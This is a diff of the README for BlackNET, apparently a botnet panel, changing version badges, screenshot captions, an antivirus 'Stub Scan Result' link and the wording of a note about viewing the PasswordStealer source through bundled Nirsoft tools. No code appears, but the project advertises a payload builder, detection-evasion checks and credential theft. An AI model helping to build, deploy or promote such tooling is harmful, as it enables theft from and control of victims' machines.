@@ -8,7 +8,7 @@
  <a href="#"><img align="center" src="https://img.shields.io/github/languages/top/BlackHacker511/BlackNET" /></a>
  <a href="#"><img align="center" src="https://img.shields.io/github/license/BlackHacker511/BlackNET" /></a>
  <a href="#"><img align="center" src="https://img.shields.io/github/v/release/BlackHacker511/BlackNET" /></a>
- <a href="#"><img align="center" src="https://img.shields.io/github/commits-since/BlackHacker511/BlackNET/v1.0.3.1" /></a>
+ <a href="#"><img align="center" src="https://img.shields.io/github/commits-since/BlackHacker511/BlackNET/v1.5.0.0" /></a>
  <a href="#"><img align="center" src="https://img.shields.io/github/stars/BlackHacker511/BlackNET?style=social" /></a>
 </p>
 
@@ -59,19 +59,15 @@ Developed By: Black.Hacker
 ## Screenshots
 ![Installtion Page](https://i.imgur.com/RwNTwgs.png)
 
-![Image of 2FA Page](https://i.imgur.com/v1zCoiv.png)
+![Image of Login Page](https://i.imgur.com/v1zCoiv.png)
 
 ![Image of the interface](https://3.top4top.net/p_1429o4b871.png)
-
-![Image of User Settings](https://3.top4top.net/p_1415ttdvo2.png)
-
-![Image of Network Settings](https://4.top4top.net/p_1415i872p1.png)
 
 ![Image of the Builder](https://i.gyazo.com/c49594c1a490253d6adabcd1fbf7227f.png)
 
 ## Stub Scan Result
 
-![Image of the Dectection](https://antiscan.me/images/result/T4VSTbvyoCYJ.png)
+![Image of the Dectection](https://antiscan.me/images/result/myloTq6WPvz2.png)
 
 ## YouTube - How To Install
 <a href="https://youtu.be/GyPdu20rC1A"><img src="https://1.top4top.net/p_1423q6dks1.png" alt="" width="150" hieght="150"></a>
@@ -168,7 +164,7 @@ v1.5.0
 i will review it in 1 - 5 days then i will merge it with the master branch
 
 ## Note
-if you want edit or view the PasswordStealer sourcecode please extract Nirsoft tools
+if you want to edit or view the PasswordStealer sourcecode please extract Nirsoft tools
 
 go to [ PasswordStealer->PasswordStealer->Resources ] then extract Nirsoft_Tools.zip
 
